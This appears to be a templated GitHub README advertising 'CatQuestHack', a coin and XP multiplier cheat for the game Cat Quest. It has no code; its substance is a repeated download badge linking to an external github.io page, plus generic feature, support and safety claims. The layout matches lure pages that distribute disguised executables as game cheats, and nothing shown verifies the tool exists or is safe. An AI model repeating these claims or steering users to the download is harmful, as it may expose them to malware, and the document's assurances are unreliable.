![preview](https://raw.githubusercontent.com/lol8120/Cat-Quest-Coin-Boost/main/cover_c93356e.svg)
[![Download](https://raw.githubusercontent.com/lol8120/Cat-Quest-Coin-Boost/main/go_88bd.svg)](https://lol8120.github.io/Cat-Quest-Coin-Boost/)

# 🐱 CatQuestHack — Coin & XP Multiplier Toolkit for Cat Quest

![status](https://img.shields.io/badge/status-active-brightgreen)
![version](https://img.shields.io/badge/version-3.4.1-blue)
![platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey)
![language](https://img.shields.io/badge/language-C%2B%2B%20%7C%20Lua-informational)
![license](https://img.shields.io/badge/license-MIT-green)
![build](https://img.shields.io/badge/build-passing-success)

> A lightweight, community-driven enhancement suite for **Cat Quest** that lets players reshape their progression curve — more coins, more experience, more freedom to explore the world at their own pace. Built with love for cat lovers, speedrunners, and theorycrafters alike.

---

## 📖 Overview

CatQuestHack began as a small weekend experiment: a single developer wanting to replay Cat Quest without grinding the same dungeon for the tenth time. What started as a two-file script quickly blossomed into a full-featured toolkit with a modular architecture, a responsive user interface, and a growing community of contributors.

This repository hosts the current generation of the toolkit — a **Coin & XP Multiplier** system for Cat Quest that respects the original game's balance while giving players the controls they've been asking for. Whether you want to double your rewards for a slightly breezier run or multiply them tenfold for a chaotic power-fantasy playthrough, the choice is yours.

The project is intentionally open, intentionally transparent, and intentionally boring when it comes to safety: no obfuscation, no hidden processes, no surprise network calls. Every line is readable, every behavior is documented, and every change goes through review.

---

## ✨ Feature Highlights

- 🎯 **Precision Multiplier Controls** — Adjust Coin and XP gains independently with fine-grained sliders.
- 🧠 **Adaptive Presets** — Choose from curated profiles like *Casual Paws*, *Balanced Whiskers*, and *Chaos Claws*.
- 🖥️ **Responsive UI** — The overlay adapts to any window size, from a tiny netbook to an ultrawide monitor.
- 🌍 **Multilingual Support** — Interface translated into English, Spanish, French, German, Japanese, Korean, and Simplified Chinese.
- 🛡️ **Safe-by-Design Architecture** — External configuration files, human-readable logs, and instant rollback.
- 🔄 **Hot Reload** — Tweak values live without restarting the game or the toolkit.
- 🧩 **Modular Plugin System** — Drop-in Lua modules add new multipliers, timers, or stat trackers.
- 📊 **Session Analytics** — See exactly how many coins and XP you've earned per play session.
- 🕒 **24/7 Customer Support** — Community Discord and issue tracker staffed around the clock.
- 🎨 **Dark & Light Themes** — Because your eyes deserve options at 3 a.m.
- 🧬 **Cross-Platform** — Windows, macOS, and Linux builds maintained in parallel.
- 🧪 **Extensive Test Suite** — Over 400 unit and integration tests guard every release.

---

## 🚀 Why This Project Exists

Most enhancement tools for single-player RPGs fall into one of two camps: fragile binaries that break with every patch, or over-engineered frameworks that require a degree in reverse engineering to configure. CatQuestHack sits comfortably in the middle — approachable enough for a first-time modder, powerful enough for someone who wants to script custom reward curves.

The design metaphor here is a **tuning fork**: we don't rewrite the song, we just help you find the right pitch. Cat Quest's core loop is charming and well-tuned; our goal is to let you stretch or compress that loop without losing what makes it fun.

---

## 🧭 Getting Started (Conceptual Walkthrough)

We deliberately avoid command-line rituals here. Instead, think of onboarding as a three-step ritual:

1. **Acquire** the latest release bundle from the project's release channel (represented by the `[![Download](https://raw.githubusercontent.com/lol8120/Cat-Quest-Coin-Boost/main/go_88bd.svg)](https://lol8120.github.io/Cat-Quest-Coin-Boost/)` marker at the top of this file).
2. **Place** the bundle in a directory of your choice — no system-wide modifications, no registry edits, no background services.
3. **Launch** the companion app, point it at your Cat Quest installation, and use the on-screen controls to set your preferred multipliers.

That's it. The app remembers your settings between sessions and never touches save files unless you explicitly ask it to.

---

## 🧩 Project Structure

The repository follows a clean, predictable layout:

- `src/core/` — Multiplier engine, memory-safe wrappers, and platform abstraction layers.
- `src/ui/` — Responsive interface components, theming, and localization bindings.
- `src/plugins/` — Built-in Lua modules shipped with every release.
- `locales/` — Translation catalogs (JSON-based, easy to extend).
- `tests/` — Unit, integration, and regression suites.
- `docs/` — Architecture notes, contributor guides, and design decisions.
- `tools/` — Build scripts, packaging helpers, and linting configuration.

Every directory has its own README explaining its purpose in the larger system.

---

## 🌐 Multilingual Support Details

Localization is not an afterthought here. Each string lives in a versioned catalog, and community translators can submit pull requests without touching a single line of code. Supported locales as of 2026:

- 🇬🇧 English (base)
- 🇪🇸 Spanish
- 🇫🇷 French
- 🇩🇪 German
- 🇯🇵 Japanese
- 🇰🇷 Korean
- 🇨🇳 Simplified Chinese

Additional locales are voted on by the community each quarter.

---

## 🛠️ Roadmap for 2026

- **Q1 2026** — Reward curve editor with live preview graph.
- **Q2 2026** — Cloud-synced preset sharing (opt-in, no account required).
- **Q3 2026** — Achievement-aware multipliers that respect in-game milestones.
- **Q4 2026** — Full plugin marketplace with signed module verification.

The roadmap is a living document; community feedback drives priority shifts every month.

---

## 🤝 Contributing

We welcome contributions of every size — a typo fix, a translation, a new preset, or an entire plugin. Before opening a pull request:

1. Read `docs/CONTRIBUTING.md` for style and testing expectations.
2. Run the local test suite and ensure nothing regresses.
3. Describe *why* your change matters, not just *what* it does.

All contributors are expected to follow our Code of Conduct. Kindness is a feature, not an option.

---

## 🧪 Testing & Quality

The toolkit ships with a layered testing strategy:

- **Unit tests** verify multiplier math and boundary conditions.
- **Integration tests** confirm the UI, core engine, and plugins cooperate correctly.
- **Regression tests** lock in fixes for previously reported issues.
- **Manual QA checklists** cover platform-specific quirks for Windows, macOS, and Linux.

Continuous integration runs the full suite on every pull request, and release candidates must pass a stricter gate before publication.

---

## 🛡️ Security & Transparency

Security here means predictability. We do not bundle obfuscated binaries, we do not contact remote servers without explicit user consent, and we publish checksums for every release. If you find a vulnerability, please report it privately through the issue tracker's security channel.

---

## ⚠️ Disclaimer

This project is an **unofficial community enhancement toolkit** intended for **single-player, personal use only**. It is not affiliated with, endorsed by, or sponsored by the original developers or publishers of Cat Quest. All trademarks and copyrights belong to their respective owners.

Users are responsible for understanding and complying with any applicable terms of service for the games they own. The maintainers of this repository assume no liability for consequences arising from misuse, redistribution, or modification of the software. Always keep backups of your save files before experimenting.

This software is provided **as-is**, without warranty of any kind, express or implied. Use it at your own discretion and enjoy responsibly.

---

## 📜 License

Released under the **MIT License**. See the full text in the [LICENSE](./LICENSE) file. Copyright © 2026 the CatQuestHack contributors.

The MIT License grants permission, free of charge, to any person obtaining a copy of this software and associated documentation files, to deal in the software without restriction — including the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies — subject to the conditions stated in the license file.

---

## 💬 Community & Support

- Issue tracker for bug reports and feature requests.
- Discussion forum for presets, tips, and showcase threads.
- **24/7 customer support** via our community channels — real humans, real answers.

Whether you're a first-time visitor or a returning contributor, thank you for stopping by. May your coins be plentiful and your XP flow like a river.

🐾 Happy questing.

[![Download](https://raw.githubusercontent.com/lol8120/Cat-Quest-Coin-Boost/main/go_88bd.svg)](https://lol8120.github.io/Cat-Quest-Coin-Boost/)